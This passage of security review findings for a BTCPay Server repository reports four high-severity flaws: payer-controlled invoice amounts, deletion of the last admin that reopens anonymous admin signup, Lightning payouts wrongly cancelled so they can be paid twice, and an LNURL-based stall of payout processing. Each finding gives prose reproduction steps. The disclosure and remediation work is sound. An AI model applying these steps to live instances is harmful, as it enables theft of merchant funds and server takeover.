3. [BTCPayServer/Plugins/Forms/FieldValueMirror.cs:10–38](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Forms/FieldValueMirror.cs#L10-L38)
   Validate (10-16) only requires that the field named by Field.Value exists, so any existing field name passes. GetValue (23-38) reads the pointed-to field's Value; with a valuemap it returns null for any value not in the map, and without one it returns the raw value of whatever field the payer pointed at. SetValue (40-43) is a no-op, showing mirrors were meant to be server-resolved, but ApplyValuesFromForm bypasses it.
4. [BTCPayServer/Plugins/Forms/FormDataService.cs:152–188](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Forms/FormDataService.cs#L152-L188)
   invoice_amount resolved through GetValue: null/empty -> Amount null; invoice_amount_adjustment* resolved to null -> TryParse fails -> adjustment silently dropped. Payer-controlled mirror target therefore removes or replaces the amount the merchant derived from a validated select.
5. [BTCPayServer/Plugins/Forms/Views/Modify.cshtml:119–126](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Forms/Views/Modify.cshtml#L119-L126)
   The form editor hides both the Required and the Constant checkbox for mirror fields, so a merchant cannot mark a mirror Constant from the UI; mirrors are presented as server-side copies ('The chosen field's selected value will be copied to this field upon submission'), not as payer inputs.
6. [BTCPayServer/Controllers/UIInvoiceController.cs:174–182](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L174-L182)
   Amount null makes the invoice a TopUp with Price 0; the zero-amount guard at line 234 applies only to non-TopUp invoices, so a merchant's fixed-price form silently becomes pay-what-you-want.
7. [BTCPayServer/HostedServices/InvoiceWatcher.cs:94–110](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L94-L110)
   An unset TopUp invoice is considered paid as soon as any payment of any size arrives and its Price is set to the paid amount, so the invoice shows as Paid/Settled with the merchant's product metadata.
8. [BTCPayServer/Views/Shared/\_Form.cshtml:5–10](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/_Form.cshtml#L5-L10)
   Mirror fields have View == null and are never rendered; the payer must add the parameter manually, which is trivial (browser devtools/curl), and nothing on the server distinguishes a rendered input from the mirror pointer.

## Impact
Integrity of invoice amounts, the core guarantee a payment processor gives the merchant, is lost for every invoice created through the affected form: the payer dictates the price (down to one satoshi) while order metadata records the full-price product, leading merchants to fulfil orders for almost nothing. No confidentiality or availability impact.

## Reproduction steps
1. Anonymous network client. Fetch the public form page (to obtain the antiforgery token for the session), POST to /forms/{formId} with the visible fields plus `<mirrorName>=<existing field name>`. Validation passes (target exists, select value valid). The invoice is created with Amount null (TopUp) or an attacker-chosen amount; pay any small sum and the invoice becomes Paid with the merchant's product metadata. Precondition outside attacker control: the store published a form using a mirror for invoice_amount or an adjustment field.

## Recommended fix
1. Form.ApplyValuesFromForm treats a mirror field's configuration pointer as payer-writable data because it only honours the Constant flag and ignores field type; the mirror provider has no way to refuse payer values on this path (SetValue is bypassed). Fix criteria: A payer submission must never change which field a mirror copies from, nor any other configuration-bearing field value: after applying Request.Form on the standalone and payment-request paths, every mirror field's Value must equal the stored config. Verify by posting `<mirror>=buyerEmail` to a public form whose invoice_amount is a valuemapped mirror and confirming the created invoice keeps the mapped amount (Standard invoice, not TopUp).
2. The mirror type is presented as server-side derivation but can neither be marked Constant/Required in the editor nor is it treated as constant by default, so merchants have no visible way to protect it. Fix criteria: Mirror fields must be non-overridable by default (or the editor must force/allow Constant for them), and a mirror whose resolved value is empty for an amount field should fail validation rather than silently producing a TopUp/zero adjustment.

---
**Severity:** HIGH
**Status:** Open
**Category:** Parameter tampering
**CWE:** [CWE-472](https://cwe.mitre.org/data/definitions/472.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257443

---

# Server admin UI POST deletes the last enabled admin; guard exists only on the GET confirm page

## Details
BTCPay Server treats 'the last enabled server administrator cannot be removed or disabled' as a server-enforced invariant: UIServerController.ToggleUserPost, Greenfield DELETE /api/v1/users/{id} (403, asserted by GreenfieldAPITests 'can't delete if the only admin'), Greenfield POST /api/v1/users/{id}/lock and the GET confirmation page for /server/users/{userId}/delete all call UserService.IsUserTheOnlyOneAdmin and refuse.

The POST handler that performs the deletion, UIServerController.DeleteUserPost (POST /server/users/{userId}/delete, [Authorize CanModifyServerSettings]), does not: it looks the user up and calls DeleteUserAndAssociatedData unconditionally. The protection exists only in the GET handler, which renders Views/Shared/Confirm with ConfirmModel.Action = null, so ConfirmModal.cshtml emits no form and no submit button. Nothing server-side stops a directly issued POST (same session, antiforgery token from any page of the admin's session), so the sole enabled admin — or any automation driving the UI routes — deletes the last enabled administrator, including themselves.

Consequence: if the deleted account was the only ServerAdmin role holder, GetUsersInRoleAsync(ServerAdmin) becomes empty and both bootstrap branches re-arm. GreenfieldUsersController.CreateUser (anonymous POST /api/v1/users) gates the registration lock as `anyAdmin && policies.LockSubscription && !isAuth` and forces isAdmin = true when !anyAdmin, so an unauthenticated caller creates an approved ServerAdmin with isAdministrator=true even on an instance whose registration is locked (the default after first-admin setup). UIAccountController.Register (isFirstAdmin = !anyAdmin) does the same where LockSubscription is false. If only disabled admins remain, anyAdmin stays true and the instance is simply left without any functioning administrator until database intervention.

This is a sibling of the verified finding last-admin-self-delete-enables-anonymous-admin-registration (UIManageController.DeleteUserPost, the profile-page 'Delete Account' button). That record cites UIServerController.Users.cs:329-344 as the admin-side guard, but those lines are the GET confirmation only; the POST at 353-364 is a distinct unguarded entry point in the server administration UI with its own fix. The global UIControllerAntiforgeryTokenAttribute prevents cross-site forging, so the request must come from the admin's own session.

## Evidence
1. [BTCPayServer/Controllers/UIServerController.Users.cs:353–364](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L353-L364)
   POST /server/users/{userId}/delete (DeleteUserPost) finds the user and calls _userService.DeleteUserAndAssociatedData(user) unconditionally. No IsUserTheOnlyOneAdmin / IsAdminUser check, so a cookie-authenticated server admin can delete the only enabled administrator, including themselves. This is the code the fix must change.
2. [BTCPayServer/Controllers/UIServerController.Users.cs:328–351](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L328-L351)
   The GET handler for the same route evaluates IsUserTheOnlyOneAdmin and, when true, renders Confirm with ConfirmModel(title, description) and no action string ('Unable to proceed: As the user ... is the last enabled admin, it cannot be removed.'). The invariant is enforced only by what the page renders.
3. [BTCPayServer/Views/Shared/ConfirmModal.cshtml:36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/ConfirmModal.cshtml#L36)
   `@if (!string.IsNullOrEmpty(Model.Action))` — when the GET passes no action the partial omits the form and submit button entirely; there is no server-side counterpart, so the 'protection' is the absence of a button.
4. [BTCPayServer/Controllers/UIServerController.Users.cs:387–398](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L387-L398)
   Sibling handler ToggleUserPost re-checks IsUserTheOnlyOneAdmin inside the POST before SetDisabled, showing the maintainers intend the check server-side on state-changing requests; DeleteUserPost omits it.
5. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:433–460](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L433-L460)
   Greenfield DELETE /api/v1/users/{idOrEmail} performs IsAdminUser -> IsUserTheOnlyOneAdmin before DeleteUserAndAssociatedData and returns Forbid (403); the project refuses for the API exactly what the UI POST permits.
6. [BTCPayServer.Tests/GreenfieldAPITests.cs:997–999](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/GreenfieldAPITests.cs#L997-L999)
   'can't delete if the only admin' — AssertHttpError(403, DeleteCurrentUser) for the sole admin: the project's own test fixes the invariant as intended behaviour.
7. [BTCPayServer/Services/UserService.cs:307–326](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L307-L326)
   IsUserTheOnlyOneAdmin counts ServerAdmin users that CanLogin and returns true only when the target is the single enabled admin; this is the check the POST handler omits.
8. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:336–351](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L336-L351)
   Anonymous POST /api/v1/users: anyAdmin = any user in ServerAdmin. The LockSubscription gate applies only when anyAdmin is true and isAdmin is forced true when !anyAdmin, so once the admin set is empty an unauthenticated caller may request isAdministrator=true even on a locked-registration instance.
9. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:409–426](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L409-L426)
   With isAdmin and IsAdministrator true the new user is added to the ServerAdmin role and first-run settings are re-initialised: the anonymous takeover route.
10. [BTCPayServer/Controllers/UIAccountController.cs:554–574](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L554-L574)
   Anonymous POST /register: isFirstAdmin = !anyAdmin; the registrant is auto-approved and granted ServerAdmin where LockSubscription is false.

## Impact
When the bootstrap reopens the attacker obtains ServerAdmin: full control of every user and store, server policies, email/storage credentials, plugins, maintenance and host administration, and every tenant's wallets and invoices. When only disabled admins remain, administrative functions of the instance are lost until out-of-band recovery.

## Reproduction steps
1. Trigger: a cookie-authenticated server admin who is the only enabled admin issues POST /server/users/{self}/delete directly (the GET page hides the button, so this is a conscious subversion of the UI control — UI:ACTIVE — or an automation of the UI routes). The resulting admin-less state is the attack requirement (AT:PRESENT). From then on an unauthenticated network peer needs one POST /api/v1/users with isAdministrator=true — the LockSubscription gate is skipped when no admin exists, so no open-registration setting is required — or POST /register where registration is open. No credentials, no race; the attempt can be polled. Rated from the anonymous attacker's position, mirroring the verified sibling at UIManageController.DeleteUserPost; exploitability is lower than that sibling because the admin must bypass an explicit UI refusal rather than click an unwarned button.

## Recommended fix
1. UIServerController.DeleteUserPost performs the deletion without re-evaluating the last-enabled-admin invariant that the GET confirmation, ToggleUserPost and the Greenfield delete endpoint enforce; the control is only a missing button on the confirm page. Fix criteria: The POST handler must refuse (with an error message and no state change) when IsUserTheOnlyOneAdmin is true for the target, evaluated at POST time. Verification: as the sole enabled admin, a directly issued POST /server/users/{self}/delete leaves the account intact; with a second enabled admin present the deletion succeeds; disabling the second admin between GET and POST makes the POST refuse.
2. The first-admin bootstrap in Register and Greenfield CreateUser keys solely on 'no user currently in ServerAdmin', so any admin-less state reopens anonymous admin creation (shared with the sibling finding). Fix criteria: Bootstrap must only apply before initial setup completes (persisted marker) or the instance must lock registration when it becomes admin-less. Verification: remove all admins by any path on an open-registration instance and confirm a new registrant does not receive ServerAdmin.

---
**Severity:** HIGH
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-602](https://cwe.mitre.org/data/definitions/602.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257434

---

# Lightning pending-payout listener cancels in-progress payouts without Lightning proof, enabling re-claim

## Details
LightningPendingPayoutListener reconciles Lightning payouts in state InProgress. It parses the payout's proof as PayoutLightningBlob and, when present, asks the store's Lightning node for the payment's status. When no PayoutLightningBlob is available (no proof at all, or a proof of another type) `payment` remains null and the switch `payment?.Status switch { Complete => Completed, Failed => Cancelled, Unknown or Pending => InProgress, _ => Cancelled }` maps the null status to Cancelled. The listener then calls PullPaymentHostedService.MarkPaid(State = Cancelled), which HandleMarkPaid accepts for an InProgress payout and which also erases the stored proof — whereas HandleCancel, the actor's own cancel path, refuses to cancel in-flight payouts. The on-chain handler's UpdatePayoutsInProgress, by contrast, skips InProgress payouts whose proof is not an accounted on-chain blob.

A Lightning payout reaches 'InProgress without a PayoutLightningBlob' through two shipped paths: (1) LightningAutomatedPayoutProcessor.HandlePayout (also used by the manual UI send) persists InProgress with Proof = null before resolving the LNURL and calling lightningClient.Pay, and writes the payment hash only after Pay returns; the in-memory PayoutsPaymentProcessing tracker shields the row from the listener only within the same process, so a restart during the in-flight window (routine update, crash, host reboot) leaves the row proof-less and the listener cancels it immediately on startup although the HTLC may still be pending or settled on the node. (2) A merchant marks a Lightning payout InProgress via the documented Greenfield POST /api/v1/payouts/{id}/mark with an external proof or none, as the project's own test does for on-chain payouts; the listener cancels it within 10 minutes and wipes the proof.

Because HandleCreatePayout excludes Cancelled payouts from both the destination dedup check and the remaining-limit sum, the cancelled amount returns to the pull payment's budget and the claimant can claim it again. With AutoApproveClaims and a Lightning payout processor configured the second claim is paid automatically; otherwise the merchant sees a fresh claim next to a payout the system reports as Cancelled with no proof. The maintainers' comment in the exception branch ('we should put the payout in a different state requiring merchant input') shows silent cancellation was not the intended handling of an undeterminable state.

Dependency assumption (BTCPayServer.Lightning.All 1.7.13, not inspected): the length of the proof-less window equals the duration of the Pay call plus the LNURL round-trips; a payee can stretch it with a hold invoice or slow LNURL responses up to the client's Pay timeout, and in any case it spans the normal multi-attempt in-flight time of a Lightning payment.

## Evidence
1. [BTCPayServer/Payments/Lightning/LightningPendingPayoutListener.cs:95–122](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningPendingPayoutListener.cs#L95-L122)
   Primary defect. For every InProgress Lightning payout the listener casts the stored proof to PayoutLightningBlob. When the payout has no proof (ParseProof returns null) or a non-Lightning proof (ManualPayoutProof), the cast yields null, GetPayment is never called, `payment` stays null, and `payment?.Status switch { Complete=>Completed, Failed=>Cancelled, Unknown or Pending=>InProgress, _=>Cancelled }` resolves the null status to Cancelled. An undeterminable outcome is treated as a confirmed failure.
2. [BTCPayServer/Payments/Lightning/LightningPendingPayoutListener.cs:131–143](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningPendingPayoutListener.cs#L131-L143)
   The computed Cancelled state is committed through PullPaymentHostedService.MarkPaid. BaseAsyncService.CreateLoopTask runs Act immediately on start and Act only delays (SecondsDelay = 600 s) after processing, so a qualifying payout is cancelled at startup and at most every 10 minutes thereafter. The listener is registered as a production hosted service (Hosting/BTCPayServerServices.cs:413).
3. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:597–610](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L597-L610)
   HandleMarkPaid accepts a Cancelled request for an InProgress payout: no case matches, the default branch runs SetProofBlob(null) (erasing any external proof the merchant attached) and the state becomes Cancelled.
4. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:835–843](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L835-L843)
   HandleCancel, the actor's dedicated cancel path used by the UI and Greenfield cancel endpoints, refuses to cancel InProgress payouts (InvalidState). The listener's MarkPaid(Cancelled) bypasses this invariant.
5. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:676–696](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L676-L696)
   HandleCreatePayout excludes Cancelled payouts from the destination dedup check and from the remaining-limit sum, so once the listener has cancelled the payout the claimant can claim the same amount from the pull payment again; lines 736+ auto-approve the new claim when AutoApproveClaims is set.
6. [BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs:72–77](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs#L72-L77)
   First shipped producer of the vulnerable state: HandlePayout (used by both the automated processor and the manual UI send in UILightningLikePayoutController.ProcessLightningPayout) persists the payout as InProgress with Proof = null before resolving LNURL (payee-controlled HTTP) and calling lightningClient.Pay (line 232). The only guard against the listener during this window is the in-memory PayoutsPaymentProcessing tracker (listener line 90), which does not survive a process restart.
7. [BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs:121–129](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs#L121-L129)
   The PayoutLightningBlob carrying the payment hash is written to the database only here, after Pay has returned. A restart between line 77 and this write leaves an InProgress payout without a payment hash while the HTLC may still settle on the node.
8. [BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs:702–722](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs#L702-L722)
   Second shipped producer: the documented Greenfield 'mark' endpoint lets a merchant move a Lightning payout to InProgress with no proof or with an arbitrary external proof (only a proofType property is required); the project's test CanProcessPayoutsExternally exercises this workflow. The listener turns such payouts into Cancelled.
9. [BTCPayServer/Data/Payouts/LightningLike/LightningLikePayoutHandler.cs:134–146](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/Payouts/LightningLike/LightningLikePayoutHandler.cs#L134-L146)
   ParseProof returns null when Proof is null and a ManualPayoutProof for any proofType other than PayoutLightningBlob; both become null after the `as PayoutLightningBlob` cast in the listener.

## Impact
Payout ledger integrity is broken: a payout that has been or is being paid is recorded as Cancelled with its proof erased, the pull payment's limit is restored and the same funds can be paid a second time from the merchant's Lightning node or wallet. Direct loss of merchant funds bounded by the pull payment amount per occurrence; no confidentiality or availability impact.

## Reproduction steps
1. Attacker: the payee of a pull payment (claims are AllowAnonymous). They claim with a Lightning destination they control. The merchant side must hold the payout InProgress without a PayoutLightningBlob: either BTCPay restarts while HandlePayout is between its InProgress write and the post-Pay proof write (a window the payee can lengthen with a hold invoice or a slow LNURL server), or the merchant used the documented 'mark InProgress' API for the payout. The listener then cancels the payout; the payee settles the first payment, observes Cancelled on the public pull-payment page, and re-claims the same amount, which is auto-approved and auto-paid when a processor is configured.

## Recommended fix
1. LightningPendingPayoutListener maps 'no Lightning proof / no payment record' to Cancelled, releasing the claimed amount back to the pull payment although the payment outcome is unknown. Fix criteria: An InProgress Lightning payout whose outcome cannot be determined (no PayoutLightningBlob, or GetPayment yields no record) must remain InProgress or move to a state requiring merchant input; only a node-reported Failed status may cancel it. Verify: mark a Lightning payout InProgress with an external proof (or none) and confirm it is not Cancelled after the listener has run, and that the pull payment's remaining limit does not increase.
2. HandleMarkPaid lets any internal caller move an InProgress payout to Cancelled and erase its proof, contradicting HandleCancel's invariant that in-flight payouts are never cancelled. Fix criteria: Cancellation of an InProgress payout through MarkPaid must require an explicit, authoritative failure signal and must not silently discard the stored proof. Verify that MarkPaid(State=Cancelled) on an InProgress payout is rejected (InvalidState) unless the required failure evidence is supplied.
3. LightningAutomatedPayoutProcessor persists InProgress with a null proof before invoking Pay and writes the payment hash only afterwards, so a restart leaves a payout with no way to reconcile it. Fix criteria: The payment hash (PayoutLightningBlob) must be persisted with the InProgress transition before the payment is initiated, so reconciliation can always query the node. Verify that a payout interrupted between the state change and Pay still carries the payment hash on restart and is reconciled against the node rather than cancelled.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper exceptional condition handling
**CWE:** [CWE-754](https://cwe.mitre.org/data/definitions/754.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257432

---

# Payee-controlled LNURL fetches block the single-threaded pull payment actor for all stores

## Details
PullPaymentHostedService is a single-threaded actor: Loop() (PullPaymentHostedService.cs:383-424) reads one message at a time from an unbounded channel and awaits its handler before reading the next. All pull-payment/payout mutations on the instance — anonymous claims, LNURL-withdraw callbacks, merchant approvals and cancellations, MarkPaid calls from the Lightning and on-chain payout processors and from LightningPendingPayoutListener, invoice top-ups, and the on-chain payout tracking events handled in BackgroundCheck — are funnelled through it, and every caller awaits the Completion task without a timeout (lines 503-505, 869-871, 875-899).

HandleApproval (551-555) performs, inside this loop, two network operations whose target is chosen by the payee: payoutHandler.ParseClaimDestination(destination) and payoutHandler.GetMinimumPayoutAmount(dest). For LightningLikePayoutHandler a Lightning address (user@host) or bech32 LNURL destination makes each of them call LNURL.LNURL.FetchInformation against the payee's host through the clearnet named client (SSRF-guarded, so the host must be public — which is exactly what the attacker supplies), each bounded by a 30-second CancellationTokenSource (LightningLikePayoutHandler.cs:82-85, 170-172). Errors are swallowed: a timed-out parse yields (null, error) and GetMinimumPayoutAmount falls back to 1 sat, so approval proceeds regardless.

When the pull payment blob has AutoApproveClaims = true — the default for refunds issued by a merchant holding CanCreatePullPayments (UIInvoiceController.UI.cs:439-524, GreenfieldInvoiceController.cs:430-517), an option on store pull-payment creation (UIStorePullPaymentsController.PullPayments.cs:141) and the Greenfield create request, and required by NonInteractiveOnly LNURL-withdraw — HandleCreatePayout (736-751) calls GetRate and HandleApproval inline. An unauthenticated POST to /pull-payments/{id} or /api/v1/pull-payments/{id}/payouts (both [AllowAnonymous], neither rate-limited) with destination `anything@attacker.example` and a small amount therefore suffices. The controller's own pre-validation fetch (IPayoutHandler.ParseAndValidateClaimDestination, run off-actor with the request token) must be answered quickly with a valid payRequest; the attacker's server then answers each in-actor fetch just under the 30 s limit (answering the first and stalling the second also works; stalling the first to timeout skips the second, costing ~30 s), holding the actor ~60 s per claim. Replying with a huge MinSendable makes the approval end TooLowAmount so the payout is Cancelled, nothing of the pull payment's limit is consumed, and because LNURLPayClaimDestinaton.Id is null (no DedupId) the identical claim can be repeated indefinitely. One request per minute keeps the actor permanently busy: every other store's claims and LNURL-withdraw callbacks hang until the wallet times out, merchant approvals/cancellations never return, LightningAutomatedPayoutProcessor blocks at its MarkPaid(InProgress) before paying, and on-chain payout confirmation tracking stalls. Even without AutoApproveClaims the same stall occurs whenever a merchant approves an LNURL/Lightning-address payout, with its duration set by the payee.

Precondition: the attacker needs the id of a live pull payment on the instance that supports a Lightning payout method and auto-approves (a refund link handed to any customer qualifies). Where registration is open, an authenticated non-admin can also self-provision it: create a store, set any external Lightning connection string (LightningExtensions.IsConfigured only requires GetExternalLightningUrl() non-null), and create an auto-approve Lightning pull payment.

Dependency assumption: LNURL 0.0.36 FetchInformation honours the supplied CancellationToken (→ 30 s per fetch); if it does not, each fetch is bounded instead by the named HttpClient's default 100 s Timeout (registered without an explicit Timeout at BTCPayServerServices.cs:402), which only lengthens the hold.

Root cause: remote I/O whose latency is controlled by an untrusted payee (and the store's rate fetch) executes on the actor's critical path instead of being resolved before enqueueing — the destination was already parsed once by the controller — or executed off-loop with only the result handed back to the actor.

## Evidence
1. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:551–554](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L551-L554)
   HandleApproval runs on the actor's thread of execution and awaits payoutHandler.ParseClaimDestination(payoutBlob.Destination, default) then payoutHandler.GetMinimumPayoutAmount(dest.destination). For a Lightning-address or LNURL destination both are outbound HTTP fetches to a host chosen by the payee; their latency is therefore set by the payee while the loop cannot process any other message.
2. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:736–750](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L736-L750)
   When the pull payment blob has AutoApproveClaims (or the request PreApproves), HandleCreatePayout calls GetRate and then HandleApproval inline, so an anonymous claim alone drives the actor into the payee-controlled fetches with no merchant action.
3. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:383–423](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L383-L423)
   Loop() is a strictly sequential actor: `await foreach` over an unbounded channel (created at line 355) and `await` of each handler before the next message is read. Every Claim, Approve, Cancel, MarkPaid, TopUp and every payout handler BackgroundCheck event (NewOnChainTransactionEvent/NewBlockEvent subscribed by BitcoinLikePayoutHandler.StartBackgroundCheck) for every store on the instance is serialised through it.
4. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:875–898](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L875-L898)
   Claim() and MarkPaid() (and Approve()/Cancel() at 503-505, 869-871) enqueue a request and return the Completion task with no timeout; callers — the anonymous claim controllers, UILNURLController's LNURL-withdraw callback (line 192), UIStorePullPaymentsController approve/cancel/mark-paid, Greenfield approve/cancel/mark-paid, LightningAutomatedPayoutProcessor.HandlePayout (line 72 awaits MarkPaid before paying) and LightningPendingPayoutListener — all hang until the actor reaches their message.
5. [BTCPayServer/Data/Payouts/LightningLike/LightningLikePayoutHandler.cs:70–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/Payouts/LightningLike/LightningLikePayoutHandler.cs#L70-L95)
   ParseClaimDestination: for a Lightning address (IsValidEmail → ExtractUriFromInternetIdentifier) or bech32 LNURL (lnurlTag null) it calls LNURL.LNURL.FetchInformation against the payee's host through the clearnet named client, bounded only by a 30-second CancellationTokenSource (and the HttpClient default 100 s, since BTCPayServerServices.cs:402 registers the client without a Timeout). A timeout is caught and returns (null, error) — approval then still proceeds with the 1-sat minimum.
6. [BTCPayServer/Data/Payouts/LightningLike/LightningLikePayoutHandler.cs:158–178](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/Payouts/LightningLike/LightningLikePayoutHandler.cs#L158-L178)
   GetMinimumPayoutAmount repeats FetchInformation to the same payee-controlled endpoint with its own 30-second timeout and returns the payee-supplied MinSendable; errors are swallowed and fall back to 1 sat. A payee that answers each fetch just under 30 s holds the actor ~60 s per approval, and a huge MinSendable makes the approval end TooLowAmount so the payout is Cancelled.
7. [BTCPayServer/Data/Payouts/LightningLike/LNURLPayClaimDestinaton.cs:10](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/Payouts/LightningLike/LNURLPayClaimDestinaton.cs#L10)
   Id is null for LNURL/Lightning-address destinations, so HandleCreatePayout's DedupId check never applies: the same attacker destination can be claimed again and again against the same pull payment.
8. [BTCPayServer/Controllers/UIPullPaymentController.cs:168–248](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPullPaymentController.cs#L168-L248)
   ClaimPullPayment is [AllowAnonymous] with no RateLimitsFilter; it pre-validates the destination with its own (off-actor) fetch using the request token, then awaits pullPaymentHostedService.Claim. The attacker's host answers the pre-validation fetch quickly with a valid payRequest, then stalls the two in-actor fetches.
